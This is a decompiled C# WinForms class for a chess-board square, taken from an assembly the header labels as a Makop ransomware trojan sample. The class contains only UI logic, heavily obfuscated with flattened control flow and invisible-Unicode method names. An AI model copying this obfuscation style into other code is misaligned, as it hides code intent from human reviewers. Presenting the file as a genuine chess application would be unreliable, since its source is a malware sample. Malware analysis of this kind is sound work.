// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.SimpleSquare
// Assembly: Yo, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 35C4B4A9-DF91-4C66-8221-B310119D49D7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-9fa98d845147978f040107c6d725a2b12ba15c204c54ed6d726c0780b40c68c3.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleChessApp.Game
{
  public class SimpleSquare : UserControl
  {
    private Color DefaultColor;
    private ChessPiece piece;
    private bool isBlackSquare;
    private IContainer components = (IContainer) null;
    public Panel panel1;

    public event EventHandler<MouseEventArgs> Click
    {
      add
      {
        EventHandler<MouseEventArgs> eventHandler = this.Click;
label_1:
        int num1 = -359300120;
        EventHandler<MouseEventArgs> comparand;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -2131590834)) % 4U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = eventHandler != comparand ? -1360726210 : (num3 = -310187084);
              num1 = num3 ^ (int) num2 * 1820422230;
              continue;
            case 2:
              comparand = eventHandler;
              eventHandler = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, (EventHandler<MouseEventArgs>) SimpleSquare.\u200B‎‌‏‫⁫‬⁪‌‪‮⁭‭‬‎‏‎‫‏⁮‏‌⁮⁪‏‏⁯⁮‍⁪​⁯⁯‫‭‫‬‍‍⁬‮((Delegate) comparand, (Delegate) value), comparand);
              num1 = -638310513;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
      remove
      {
        EventHandler<MouseEventArgs> eventHandler = this.Click;
label_1:
        int num1 = -339621439;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -816667170)) % 3U)
          {
            case 0:
              goto label_3;
            case 1:
              EventHandler<MouseEventArgs> comparand = eventHandler;
              eventHandler = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, (EventHandler<MouseEventArgs>) SimpleSquare.\u202C‍‭⁪‫‬⁬‍‍‪⁫‪‬⁬‏⁮‏‭‍⁬⁬‎⁮‮‎⁯⁭‎‬‏⁯‍‫‎‎‎​⁭⁬‍‮((Delegate) comparand, (Delegate) value), comparand);
              int num3;
              num1 = num3 = eventHandler == comparand ? -1455226694 : (num3 = -339621439);
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public ChessPiece Piece
    {
      get
      {
label_1:
        int num1 = -599399460;
        ChessPiece piece;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1334525433)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              piece = this.piece;
              num1 = (int) num2 * -709580773 ^ 199407880;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return piece;
      }
      set
      {
        this.piece = value;
        if (this.piece != null)
          goto label_9;
label_1:
        int num1 = -328240637;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1818439226)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * 773096348 ^ -804149528;
              continue;
            case 2:
              num1 = (int) num2 * 1305502362 ^ 1009610629;
              continue;
            case 3:
              goto label_9;
            case 4:
              num1 = (int) num2 * 1086128963 ^ -721990283;
              continue;
            case 5:
              this.piece = (ChessPiece) null;
              num1 = (int) num2 * 1769537330 ^ -762561078;
              continue;
            case 6:
              SimpleSquare.\u200C‍⁮⁭‪‍⁯⁭‪‮⁮‏⁯⁫⁭​⁭⁮⁮‭‮‎⁭⁫‏⁯​⁫​‍⁯‫‭⁭⁭‮⁪‭‬‪‮((Control) this, (Image) null);
              num1 = (int) num2 * -1768109694 ^ 1822647843;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:
        return;
label_9:
        SimpleSquare.\u200C‍⁮⁭‪‍⁯⁭‪‮⁮‏⁯⁫⁭​⁭⁮⁮‭‮‎⁭⁫‏⁯​⁫​‍⁯‫‭⁭⁭‮⁪‭‬‪‮((Control) this, this.repo.GetPiece(this.piece.Kind, this.piece.Color));
        num1 = -1176651190;
        goto label_2;
      }
    }

    public void colorSquare()
    {
label_1:
      int num1 = 269207152;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2133817352)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            this.DefaultColor = this.IsBlackSquare ? Color.CornflowerBlue : Color.WhiteSmoke;
            SimpleSquare.\u206D‎‍⁮‮⁮⁪⁮⁮⁮‫‎‫​‪‏⁫‍⁯‮⁫​‪‬‍‭‫‌⁬⁯‍‪⁪‮‪‪‌⁭‮‍‮((Control) this, this.DefaultColor);
            num1 = 2069250109;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public Pieces Kind
    {
      set
      {
        this.Piece.Kind = value;
        this.Piece = this.Piece;
      }
    }

    public bool IsBlackSquare
    {
      get
      {
label_1:
        int num1 = -1459774637;
        bool isBlackSquare;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1813264229)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              isBlackSquare = this.isBlackSquare;
              num1 = (int) num2 * 1364064166 ^ -1218842585;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return isBlackSquare;
      }
      set
      {
label_1:
        int num1 = 1981805025;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1376649157)) % 5U)
          {
            case 0:
              num1 = (int) num2 * -1401103123 ^ -62886114;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              this.colorSquare();
              num1 = (int) num2 * 282798298 ^ -1174813344;
              continue;
            case 4:
              this.isBlackSquare = value;
              num1 = (int) num2 * 169049268 ^ -759837863;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public Repository repo
    {
      get
      {
label_1:
        int num1 = 1388192510;
        Repository repo;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2022451223)) % 4U)
          {
            case 0:
              num1 = (int) num2 * 1891144265 ^ 661057197;
              continue;
            case 1:
              repo = ChessContext.repo;
              num1 = (int) num2 * 1305305922 ^ 795187477;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return repo;
      }
    }

    public SimpleSquare()
    {
      this.InitializeComponent();
      SimpleSquare.\u200C‬‎‫‌‬‎‭⁮‌‫⁬⁬⁯‬⁭‬‪‮⁮‪‭‏⁪‬‫‮‬⁪‬‌⁭⁪⁮⁮‮‎⁮⁯‍‮((Control) this, new MouseEventHandler(this.Square_MouseClick));
      SimpleSquare.\u200C‏‬⁭‫⁭‪⁭‏‍‫‮‏⁯‍‮‎‬⁫‍‪⁫⁬⁪‏⁭⁯‫‪⁫‬‭‬‬‏​⁫‌⁭⁫‮((Control) this.panel1, new MouseEventHandler(this.Square_MouseClick));
    }

    private void Square_MouseClick(object sender, MouseEventArgs e)
    {
label_1:
      int num1 = 1170754740;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1417467011)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -110859018 ^ 1387757519;
            continue;
          case 2:
            goto label_3;
          case 3:
            EventHandler<MouseEventArgs> click = this.Click;
            if (click != null)
            {
              click((object) this, e);
              num1 = (int) num2 * -1293950705 ^ -1600377733;
              continue;
            }
            goto label_5;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_5:;
    }

    public void HighLight()
    {
      SimpleSquare.\u206D‎‍⁮‮⁮⁪⁮⁮⁮‫‎‫​‪‏⁫‍⁯‮⁫​‪‬‍‭‫‌⁬⁯‍‪⁪‮‪‪‌⁭‮‍‮((Control) this, Color.ForestGreen);
label_1:
      int num1 = 117452028;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1436986350)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -132518603 ^ -16001606;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public void ClearHighLight() => SimpleSquare.\u206D‎‍⁮‮⁮⁪⁮⁮⁮‫‎‫​‪‏⁫‍⁯‮⁫​‪‬‍‭‫‌⁬⁯‍‪⁪‮‪‪‌⁭‮‍‮((Control) this, this.DefaultColor);

    public bool IsEmpty
    {
      get
      {
        bool isEmpty = this.Piece == null;
label_1:
        int num1 = -1624395896;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -303480662)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * 700938346 ^ -953549746;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return isEmpty;
      }
    }

    protected override void Dispose(bool disposing)
    {
label_1:
      int num1 = 1602111916;
      while (true)
      {
        uint num2;
        bool flag;
        int num3;
        switch ((num2 = (uint) (num1 ^ 678860891)) % 10U)
        {
          case 0:
            num1 = (int) num2 * 46916755 ^ 1266841330;
            continue;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * 171714325 ^ -1296421627;
            continue;
          case 3:
            if (disposing)
            {
              num1 = (int) num2 * 1580628498 ^ -364073008;
              continue;
            }
            num3 = 0;
            break;
          case 4:
            num1 = (int) num2 * 1702976570 ^ -1243456209;
            continue;
          case 5:
            int num4 = flag ? 1515305719 : (num4 = 1691819891);
            num1 = num4 ^ (int) num2 * 1782148596;
            continue;
          case 6:
            base.Dispose(disposing);
            num1 = 2009178925;
            continue;
          case 7:
            goto label_1;
          case 8:
            SimpleSquare.\u206D​‮‏‫‎‎⁬‌‍⁯‏‬‭‪‬​‎‬‪‭‬⁪‌‌⁮‮‪⁭‭⁮⁭‎‭‬‬⁯‍‍⁬‮((IDisposable) this.components);
            num1 = (int) num2 * 1199633237 ^ -144762031;
            continue;
          case 9:
            num3 = this.components != null ? 1 : 0;
            break;
          default:
            goto label_15;
        }
        flag = num3 != 0;
        num1 = 1148072938;
      }
label_3:
      return;
label_15:;
    }

    private void InitializeComponent()
    {
label_1:
      int num1 = 884462540;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1679701588)) % 25U)
        {
          case 0:
            SimpleSquare.\u206F⁭⁭‍‪‏‪⁮⁫⁮⁫‫‬‭​‏‍‪‫‬⁪⁮‮⁫⁯‌⁮‮⁭⁬⁪⁯‍‭‬‪‬‍‬⁮‮((Control) this, new Size(137, 132));
            num1 = (int) num2 * 539736036 ^ -714614503;
            continue;
          case 1:
            num1 = (int) num2 * -301159096 ^ 2130475325;
            continue;
          case 2:
            SimpleSquare.\u206D‎‍⁮‮⁮⁪⁮⁮⁮‫‎‫​‪‏⁫‍⁯‮⁫​‪‬‍‭‫‌⁬⁯‍‪⁪‮‪‪‌⁭‮‍‮((Control) this.panel1, Color.Transparent);
            num1 = (int) num2 * -1869526149 ^ -1234424177;
            continue;
          case 3:
            goto label_3;
          case 4:
            SimpleSquare.\u202E⁮⁪‬‬‪⁯‏‬‭⁭‫⁭‬‏‪⁮‭‎⁯​‪⁭⁭‫‮‪‍‪⁯⁪⁫‪‎​⁭‬‪⁯⁯‮((ContainerControl) this, AutoScaleMode.Font);
            num1 = (int) num2 * 685888507 ^ -1965446135;
            continue;
          case 5:
            goto label_1;
          case 6:
            num1 = (int) num2 * 1998250482 ^ 1085724256;
            continue;
          case 7:
            SimpleSquare.\u206E‭‌‏⁬⁮‪⁭⁮‬‍‪‫‬‪‏⁬‮‬‬‍‏‪‪‏‪‎‌⁯‭⁯⁬‮​‬‫⁫‪⁬‍‮((Control) this, false);
            num1 = (int) num2 * -2100101306 ^ -435426870;
            continue;
          case 8:
            num1 = (int) num2 * 1846154982 ^ 1593465960;
            continue;
          case 9:
            SimpleSquare.\u202C⁬⁮‌‬‪⁯‮‏‫‬‮⁯‮⁪⁫‎‫‭⁪‎​⁮‭​⁮‭‎‫‏‪‮⁫‍⁬⁯‫⁬⁯‎‮((Control) this, new Padding(0));
            num1 = (int) num2 * -1081435723 ^ 2112096845;
            continue;
          case 10:
            num1 = (int) num2 * 519267010 ^ -593431275;
            continue;
          case 11:
            num1 = (int) num2 * 917254675 ^ -997483326;
            continue;
          case 12:
            SimpleSquare.\u206E⁫⁮​‌⁯⁭⁬​‎‪⁬‏⁮‏⁮⁯⁮⁭‭‎‫​⁪⁪‪‮⁬‎⁫‬‮​⁯‫⁮⁬⁫⁬⁯‮((Control) this);
            num1 = (int) num2 * -930231427 ^ -421369489;
            continue;
          case 13:
            SimpleSquare.\u206F⁫⁯⁫‭‭‌‍‮⁪⁮⁮‭‫⁯⁫‏‮‎⁭‫‏‫‫⁯‌‪⁪‏⁫​‏‌⁯⁭‍⁭‪‏⁫‮((ContainerControl) this, new SizeF(6f, 13f));
            num1 = (int) num2 * 713565729 ^ 1435297901;
            continue;
          case 14:
            SimpleSquare.\u202B⁫⁬⁬‎⁫‍⁮‪‭⁮​⁫⁭⁮⁮‎⁪‌‮⁬⁮⁯⁬‬⁮‪⁮⁭​‎‏‎⁪‬⁪⁮‌⁫‪‮((Control) this, ImageLayout.Center);
            num1 = (int) num2 * 1548128935 ^ -483592898;
            continue;
          case 15:
            this.panel1 = SimpleSquare.\u206F⁫⁯​‭⁭​‌⁪‮⁭⁭⁭‍⁪‌‮‫​‏​⁭‫⁬​‏‭‪‍‬‪⁮‬​‌‫‭⁮⁯‎‮();
            num1 = (int) num2 * -314273839 ^ 1522823232;
            continue;
          case 16:
            SimpleSquare.\u206E‌⁫⁭‭⁮‌⁭‬‏⁮⁭‬⁫⁫‭‭‬‮⁯‎‌‪‫‍⁯‏‮‫‮⁪‭‫‍⁮​⁮​⁯⁬‮((Control) this, \u003CModule\u003E.\u200D⁬‎‬⁫⁯⁯​​‍‪⁭‍‫‫‮‎‏​‫⁯⁮​⁯⁭⁭⁫⁯‏⁮‏‫​⁪‪⁭⁮‭⁭‎‮<string>(405494456U));
            num1 = (int) num2 * -618154650 ^ 2103222178;
            continue;
          case 17:
            SimpleSquare.\u202B⁫⁬⁬‎⁫‍⁮‪‭⁮​⁫⁭⁮⁮‎⁪‌‮⁬⁮⁯⁬‬⁮‪⁮⁭​‎‏‎⁪‬⁪⁮‌⁫‪‮((Control) this.panel1, ImageLayout.Center);
            num1 = (int) num2 * 645180381 ^ -441088171;
            continue;
          case 18:
            SimpleSquare.\u200E​‫‎‎‎⁫‌‮‪‫‌‏⁬⁯⁪‫‭⁮​‬⁮⁯‮⁫⁯‎‎‮⁭‭‪‌⁯‌⁫⁫⁮⁮⁪‮((Control) this.panel1, DockStyle.Fill);
            num1 = (int) num2 * 551203759 ^ 1395668221;
            continue;
          case 19:
            SimpleSquare.\u200C‎‪⁪‏‪⁯⁫⁫‪‭‌⁮⁬⁪⁬‎‬⁭‍‬‍‬⁯⁭‪‏⁭⁮‬⁫‌‍‏‭‎⁯‎‫⁮‮((Control) this.panel1, new Point(0, 0));
            num1 = (int) num2 * -1139859272 ^ 1997915773;
            continue;
          case 20:
            num1 = (int) num2 * 500838437 ^ -924802496;
            continue;
          case 21:
            SimpleSquare.\u202B⁯⁪⁭‫‌‭⁪⁫⁬⁫‎​‎‮‮‍‌‏‬⁬⁪​‬‏⁭⁭‪⁯⁬⁬‫‍‌‭⁭‬⁯‭⁫‮((Control) this.panel1, \u003CModule\u003E.\u200C‫‌‍‭​‫⁬‮‬‫⁪‫‪‫‪⁬⁯⁫‎‎‌‬‬‮⁬‍‭‌⁫⁯‮⁭⁬‍⁮‫‭‏‬‮<string>(2594323502U));
            num1 = (int) num2 * -1273922161 ^ -486366787;
            continue;
          case 22:
            SimpleSquare.\u200E​‬‏⁬‍‍‍‫⁫⁭‮‮‎​‮‭​⁭‎⁫‍⁫​⁪⁭‎‫‬​‬⁫⁬⁮‮⁪⁫‬‎‌‮(SimpleSquare.\u206D​​‌​‪‌‍⁫‫‬‌⁬⁭‪‭​‭‎⁬‬⁬⁪⁬‌‮⁬‫‬⁭​⁯‎‫⁫​‪‏​⁯‮((Control) this), (Control) this.panel1);
            num1 = (int) num2 * 1100546618 ^ 805891760;
            continue;
          case 23:
            SimpleSquare.\u202A‍⁭‎⁫⁪‍⁬⁫‮⁯‎‫⁫‬‮‍⁪‫⁪‏‏‫⁬‎‬⁬‫‪​⁬‫‌‍‏‌⁪‮‍⁮‮((Control) this.panel1, new Size(137, 132));
            SimpleSquare.\u202A‭⁯‭‮‭‬‫⁬⁪‎⁮⁪‬‌‏⁫‪‬⁬‏‬⁯⁪⁫⁫‮​⁬⁫‬⁭‏⁪‍‌⁯‍⁪⁬‮((Control) this.panel1, 0);
            num1 = (int) num2 * 1247232657 ^ -1986721584;
            continue;
          case 24:
            num1 = (int) num2 * -629417918 ^ -212216303;
            continue;
          default:
            goto label_27;
        }
      }
label_3:
      return;
label_27:;
    }

    static Delegate \u200B‎‌‏‫⁫‬⁪‌‪‮⁭‭‬‎‏‎‫‏⁮‏‌⁮⁪‏‏⁯⁮‍⁪​⁯⁯‫‭‫‬‍‍⁬‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u202C‍‭⁪‫‬⁬‍‍‪⁫‪‬⁬‏⁮‏‭‍⁬⁬‎⁮‮‎⁯⁭‎‬‏⁯‍‫‎‎‎​⁭⁬‍‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static void \u200C‍⁮⁭‪‍⁯⁭‪‮⁮‏⁯⁫⁭​⁭⁮⁮‭‮‎⁭⁫‏⁯​⁫​‍⁯‫‭⁭⁭‮⁪‭‬‪‮([In] Control obj0, [In] Image obj1) => obj0.BackgroundImage = obj1;

    static void \u206D‎‍⁮‮⁮⁪⁮⁮⁮‫‎‫​‪‏⁫‍⁯‮⁫​‪‬‍‭‫‌⁬⁯‍‪⁪‮‪‪‌⁭‮‍‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static void \u200C‬‎‫‌‬‎‭⁮‌‫⁬⁬⁯‬⁭‬‪‮⁮‪‭‏⁪‬‫‮‬⁪‬‌⁭⁪⁮⁮‮‎⁮⁯‍‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u200C‏‬⁭‫⁭‪⁭‏‍‫‮‏⁯‍‮‎‬⁫‍‪⁫⁬⁪‏⁭⁯‫‪⁫‬‭‬‬‏​⁫‌⁭⁫‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u206D​‮‏‫‎‎⁬‌‍⁯‏‬‭‪‬​‎‬‪‭‬⁪‌‌⁮‮‪⁭‭⁮⁭‎‭‬‬⁯‍‍⁬‮([In] IDisposable obj0) => obj0.Dispose();

    static Panel \u206F⁫⁯​‭⁭​‌⁪‮⁭⁭⁭‍⁪‌‮‫​‏​⁭‫⁬​‏‭‪‍‬‪⁮‬​‌‫‭⁮⁯‎‮() => new Panel();

    static void \u206E⁫⁮​‌⁯⁭⁬​‎‪⁬‏⁮‏⁮⁯⁮⁭‭‎‫​⁪⁪‪‮⁬‎⁫‬‮​⁯‫⁮⁬⁫⁬⁯‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u202B⁫⁬⁬‎⁫‍⁮‪‭⁮​⁫⁭⁮⁮‎⁪‌‮⁬⁮⁯⁬‬⁮‪⁮⁭​‎‏‎⁪‬⁪⁮‌⁫‪‮([In] Control obj0, [In] ImageLayout obj1) => obj0.BackgroundImageLayout = obj1;

    static void \u200E​‫‎‎‎⁫‌‮‪‫‌‏⁬⁯⁪‫‭⁮​‬⁮⁯‮⁫⁯‎‎‮⁭‭‪‌⁯‌⁫⁫⁮⁮⁪‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static void \u200C‎‪⁪‏‪⁯⁫⁫‪‭‌⁮⁬⁪⁬‎‬⁭‍‬‍‬⁯⁭‪‏⁭⁮‬⁫‌‍‏‭‎⁯‎‫⁮‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static void \u202B⁯⁪⁭‫‌‭⁪⁫⁬⁫‎​‎‮‮‍‌‏‬⁬⁪​‬‏⁭⁭‪⁯⁬⁬‫‍‌‭⁭‬⁯‭⁫‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u202A‍⁭‎⁫⁪‍⁬⁫‮⁯‎‫⁫‬‮‍⁪‫⁪‏‏‫⁬‎‬⁬‫‪​⁬‫‌‍‏‌⁪‮‍⁮‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u202A‭⁯‭‮‭‬‫⁬⁪‎⁮⁪‬‌‏⁫‪‬⁬‏‬⁯⁪⁫⁫‮​⁬⁫‬⁭‏⁪‍‌⁯‍⁪⁬‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static void \u206F⁫⁯⁫‭‭‌‍‮⁪⁮⁮‭‫⁯⁫‏‮‎⁭‫‏‫‫⁯‌‪⁪‏⁫​‏‌⁯⁭‍⁭‪‏⁫‮([In] ContainerControl obj0, [In] SizeF obj1) => obj0.AutoScaleDimensions = obj1;

    static void \u202E⁮⁪‬‬‪⁯‏‬‭⁭‫⁭‬‏‪⁮‭‎⁯​‪⁭⁭‫‮‪‍‪⁯⁪⁫‪‎​⁭‬‪⁯⁯‮(
      [In] ContainerControl obj0,
      [In] AutoScaleMode obj1)
    {
      obj0.AutoScaleMode = obj1;
    }

    static Control.ControlCollection \u206D​​‌​‪‌‍⁫‫‬‌⁬⁭‪‭​‭‎⁬‬⁬⁪⁬‌‮⁬‫‬⁭​⁯‎‫⁫​‪‏​⁯‮(
      [In] Control obj0)
    {
      return obj0.Controls;
    }

    static void \u200E​‬‏⁬‍‍‍‫⁫⁭‮‮‎​‮‭​⁭‎⁫‍⁫​⁪⁭‎‫‬​‬⁫⁬⁮‮⁪⁫‬‎‌‮(
      [In] Control.ControlCollection obj0,
      [In] Control obj1)
    {
      obj0.Add(obj1);
    }

    static void \u202C⁬⁮‌‬‪⁯‮‏‫‬‮⁯‮⁪⁫‎‫‭⁪‎​⁮‭​⁮‭‎‫‏‪‮⁫‍⁬⁯‫⁬⁯‎‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u206E‌⁫⁭‭⁮‌⁭‬‏⁮⁭‬⁫⁫‭‭‬‮⁯‎‌‪‫‍⁯‏‮‫‮⁪‭‫‍⁮​⁮​⁯⁬‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u206F⁭⁭‍‪‏‪⁮⁫⁮⁫‫‬‭​‏‍‪‫‬⁪⁮‮⁫⁯‌⁮‮⁭⁬⁪⁯‍‭‬‪‬‍‬⁮‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u206E‭‌‏⁬⁮‪⁭⁮‬‍‪‫‬‪‏⁬‮‬‬‍‏‪‪‏‪‎‌⁯‭⁯⁬‮​‬‫⁫‪⁬‍‮([In] Control obj0, [In] bool obj1) => obj0.ResumeLayout(obj1);
  }
}
